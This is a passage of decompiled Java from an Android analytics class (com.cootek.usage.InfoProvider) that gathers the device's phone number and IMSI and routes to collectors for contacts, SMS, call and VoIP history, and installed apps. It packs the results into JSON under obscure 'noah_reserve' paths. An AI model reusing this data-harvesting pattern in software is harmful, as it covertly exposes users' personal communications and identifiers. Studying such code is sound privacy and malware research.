    //   258: lcmp
    //   259: ifle +354 -> 613
    //   262: iconst_1
    //   263: istore 5
    //   265: goto +3 -> 268
    //   268: aload 12
    //   270: ldc_w 263
    //   273: iload 5
    //   275: invokevirtual 272	org/json/JSONObject:put	(Ljava/lang/String;Z)Lorg/json/JSONObject;
    //   278: pop
    //   279: aload 12
    //   281: ldc_w 567
    //   284: aload 8
    //   286: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   289: pop
    //   290: aload 12
    //   292: ldc_w 563
    //   295: aload 9
    //   297: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   300: pop
    //   301: aload 11
    //   303: aload 12
    //   305: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   308: pop
    //   309: aload 10
    //   311: iconst_1
    //   312: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   315: goto +15 -> 330
    //   318: astore 6
    //   320: goto +5 -> 325
    //   323: astore 6
    //   325: aload 6
    //   327: invokevirtual 152	org/json/JSONException:printStackTrace	()V
    //   330: aload 7
    //   332: invokeinterface 275 1 0
    //   337: istore 5
    //   339: iload 5
    //   341: ifne +6 -> 347
    //   344: goto +19 -> 363
    //   347: goto -191 -> 156
    //   350: astore 6
    //   352: goto +222 -> 574
    //   355: astore 8
    //   357: goto +138 -> 495
    //   360: goto +179 -> 539
    //   363: aload 7
    //   365: ifnull +20 -> 385
    //   368: aload 7
    //   370: invokeinterface 278 1 0
    //   375: goto +10 -> 385
    //   378: astore 6
    //   380: aload 6
    //   382: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   385: new 133	org/json/JSONObject
    //   388: dup
    //   389: invokespecial 134	org/json/JSONObject:<init>	()V
    //   392: astore 6
    //   394: aload 6
    //   396: ldc -102
    //   398: aload 11
    //   400: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   403: pop
    //   404: goto +10 -> 414
    //   407: astore 7
    //   409: aload 7
    //   411: invokevirtual 152	org/json/JSONException:printStackTrace	()V
    //   414: new 156	com/cootek/usage/UsageData
    //   417: dup
    //   418: invokespecial 157	com/cootek/usage/UsageData:<init>	()V
    //   421: astore 7
    //   423: aload 7
    //   425: aload_0
    //   426: invokevirtual 160	com/cootek/usage/InfoProvider:getType	()Ljava/lang/String;
    //   429: putfield 163	com/cootek/usage/UsageData:type	Ljava/lang/String;
    //   432: aload 7
    //   434: aload_0
    //   435: iconst_2
    //   436: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   439: putfield 169	com/cootek/usage/UsageData:path	Ljava/lang/String;
    //   442: aload 7
    //   444: aload 6
    //   446: invokevirtual 170	org/json/JSONObject:toString	()Ljava/lang/String;
    //   449: putfield 173	com/cootek/usage/UsageData:value	Ljava/lang/String;
    //   452: aload 10
    //   454: aload 7
    //   456: putfield 176	com/cootek/usage/InfoProvider$InfoData:data	Lcom/cootek/usage/UsageData;
    //   459: aload 10
    //   461: aload_0
    //   462: iconst_2
    //   463: invokevirtual 166	com/cootek/usage/InfoProvider:getPath	(I)Ljava/lang/String;
    //   466: putfield 179	com/cootek/usage/InfoProvider$InfoData:infoPath	Ljava/lang/String;
    //   469: aload 10
    //   471: areturn
    //   472: astore 7
    //   474: aload 6
    //   476: astore 8
    //   478: aload 7
    //   480: astore 6
    //   482: aload 8
    //   484: astore 7
    //   486: goto +88 -> 574
    //   489: astore 8
    //   491: aload 9
    //   493: astore 7
    //   495: aload 7
    //   497: astore 6
    //   499: aload 8
    //   501: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   504: aload 7
    //   506: astore 6
    //   508: aload 10
    //   510: iconst_0
    //   511: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   514: aload 7
    //   516: ifnull +20 -> 536
    //   519: aload 7
    //   521: invokeinterface 278 1 0
    //   526: aload 10
    //   528: areturn
    //   529: astore 6
    //   531: aload 6
    //   533: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   536: aload 10
    //   538: areturn
    //   539: aload 7
    //   541: astore 6
    //   543: aload 10
    //   545: iconst_0
    //   546: putfield 149	com/cootek/usage/InfoProvider$InfoData:hasData	Z
    //   549: aload 7
    //   551: ifnull +20 -> 571
    //   554: aload 7
    //   556: invokeinterface 278 1 0
    //   561: aload 10
    //   563: areturn
    //   564: astore 6
    //   566: aload 6
    //   568: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   571: aload 10
    //   573: areturn
    //   574: aload 7
    //   576: ifnull +20 -> 596
    //   579: aload 7
    //   581: invokeinterface 278 1 0
    //   586: goto +10 -> 596
    //   589: astore 7
    //   591: aload 7
    //   593: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   596: aload 6
    //   598: athrow
    //   599: astore 6
    //   601: aload 8
    //   603: astore 7
    //   605: goto -66 -> 539
    //   608: astore 6
    //   610: goto -250 -> 360
    //   613: iconst_0
    //   614: istore 5
    //   616: goto -348 -> 268
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	619	0	this	InfoProvider
    //   55	202	1	l1	long
    //   192	45	3	l2	long
    //   263	352	5	bool	boolean
    //   42	185	6	localObject1	Object
    //   318	1	6	localJSONException1	JSONException
    //   323	3	6	localJSONException2	JSONException
    //   350	1	6	localObject2	Object
    //   378	3	6	localRuntimeException1	RuntimeException
    //   392	115	6	localObject3	Object
    //   529	3	6	localRuntimeException2	RuntimeException
    //   541	1	6	localObject4	Object
    //   564	33	6	localRuntimeException3	RuntimeException
    //   599	1	6	localSecurityException1	SecurityException
    //   608	1	6	localSecurityException2	SecurityException
    //   38	331	7	localCursor	android.database.Cursor
    //   407	3	7	localJSONException3	JSONException
    //   421	34	7	localUsageData	UsageData
    //   472	7	7	localObject5	Object
    //   484	96	7	localObject6	Object
    //   589	3	7	localRuntimeException4	RuntimeException
    //   603	1	7	localRuntimeException5	RuntimeException
    //   35	250	8	str1	String
    //   355	1	8	localRuntimeException6	RuntimeException
    //   476	7	8	localObject7	Object
    //   489	113	8	localRuntimeException7	RuntimeException
    //   32	460	9	str2	String
    //   8	564	10	localInfoData	InfoData
    //   29	370	11	localJSONArray	JSONArray
    //   20	284	12	localObject8	Object
    // Exception table:
    //   from	to	target	type
    //   309	315	318	org/json/JSONException
    //   222	256	323	org/json/JSONException
    //   268	309	323	org/json/JSONException
    //   133	156	350	finally
    //   156	175	350	finally
    //   184	222	350	finally
    //   222	256	350	finally
    //   268	309	350	finally
    //   309	315	350	finally
    //   325	330	350	finally
    //   330	339	350	finally
    //   133	156	355	java/lang/RuntimeException
    //   156	175	355	java/lang/RuntimeException
    //   184	222	355	java/lang/RuntimeException
    //   222	256	355	java/lang/RuntimeException
    //   268	309	355	java/lang/RuntimeException
    //   309	315	355	java/lang/RuntimeException
    //   325	330	355	java/lang/RuntimeException
    //   330	339	355	java/lang/RuntimeException
    //   368	375	378	java/lang/RuntimeException
    //   394	404	407	org/json/JSONException
    //   44	56	472	finally
    //   60	128	472	finally
    //   499	504	472	finally
    //   508	514	472	finally
    //   543	549	472	finally
    //   44	56	489	java/lang/RuntimeException
    //   60	128	489	java/lang/RuntimeException
    //   519	526	529	java/lang/RuntimeException
    //   554	561	564	java/lang/RuntimeException
    //   579	586	589	java/lang/RuntimeException
    //   44	56	599	java/lang/SecurityException
    //   60	128	599	java/lang/SecurityException
    //   133	156	608	java/lang/SecurityException
    //   156	175	608	java/lang/SecurityException
    //   184	222	608	java/lang/SecurityException
    //   222	256	608	java/lang/SecurityException
    //   268	309	608	java/lang/SecurityException
    //   309	315	608	java/lang/SecurityException
    //   325	330	608	java/lang/SecurityException
    //   330	339	608	java/lang/SecurityException
  }
  
  private InfoData getTelephoneNumber()
  {
    InfoData localInfoData = new InfoData();
    JSONArray localJSONArray = new JSONArray();
    JSONObject localJSONObject1 = new JSONObject();
    try
    {
      String str1 = PhoneNumberUtil.GetTelephoneNumber(UsageRecorder.sAssist.getContext());
      String str2 = PhoneNumberUtil.GetTelephoneIMSI(UsageRecorder.sAssist.getContext());
      localJSONObject1.put("phone", str1);
      localJSONObject1.put("IMSI", str2);
      localJSONArray.put(localJSONObject1);
      localInfoData.hasData = true;
    }
    catch (JSONException localJSONException2)
    {
      localJSONException2.printStackTrace();
    }
    JSONObject localJSONObject2 = new JSONObject();
    try
    {
      localJSONObject2.put("data", localJSONArray);
    }
    catch (JSONException localJSONException1)
    {
      localJSONException1.printStackTrace();
    }
    UsageData localUsageData = new UsageData();
    localUsageData.type = getType();
    localUsageData.path = getPath(5);
    localUsageData.value = localJSONObject2.toString();
    localInfoData.data = localUsageData;
    localInfoData.infoPath = getPath(5);
    return localInfoData;
  }
  
  InfoData getData(int paramInt)
  {
    switch (paramInt)
    {
    default: 
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("error info value: ");
      localStringBuilder.append(paramInt);
      throw new IllegalArgumentException(localStringBuilder.toString());
    case 5: 
      return getTelephoneNumber();
    case 4: 
      return getCallVoipHistory();
    case 3: 
      return getApps();
    case 2: 
      return getSms();
    case 1: 
      return getCallHistory();
    }
    return getContact();
  }
  
  String getPath(int paramInt)
  {
    switch (paramInt)
    {
    default: 
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("error info value: ");
      localStringBuilder.append(paramInt);
      throw new IllegalArgumentException(localStringBuilder.toString());
    case 5: 
      return "noah_reserve_05";
    case 4: 
      return "noah_reserve_04";
    case 3: 
      return "noah_reserve_03";
    case 2: 
      return "noah_reserve_02";
    case 1: 
      return "noah_reserve_01";
    }
    return "noah_reserve_00";
  }
  
  String getType()
  {
    return "noah_info";
  }
  
  int length()
  {
    return 6;
  }
  
  private class AddressItem
  {
    String address;
    String type;
    
    private AddressItem() {}
  }
  
  private class ContactItem
  {
    HashSet<InfoProvider.AddressItem> address;
    HashSet<InfoProvider.EmailItem> email;
    HashSet<InfoProvider.EventItem> event;
    long id;
    HashSet<InfoProvider.ImItem> im;
    String name;
    HashSet<InfoProvider.OrganizationItem> organization;
    HashSet<String> phone;
    HashSet<InfoProvider.RelationItem> relation;
    
    private ContactItem() {}
  }
  
  private class EmailItem
  {
    String email;
    String type;
    
    private EmailItem() {}
  }
  
  private class EventItem
  {
    String date;
    String type;
    
    private EventItem() {}
  }
  
  private class ImItem
  {
    String im;
    String protocol;
    String type;
    
    private ImItem() {}
  }
  
  class InfoData
  {
    UsageData data;
    boolean hasData;
    String infoPath;
    long lastId;
    
    InfoData() {}
  }
  
  private class OrganizationItem
  {
    String company;
    String department;
    String title;
    String type;
    
    private OrganizationItem() {}
  }
  
  private class RelationItem
  {
    String name;
    String type;
    
    private RelationItem() {}
  }
}
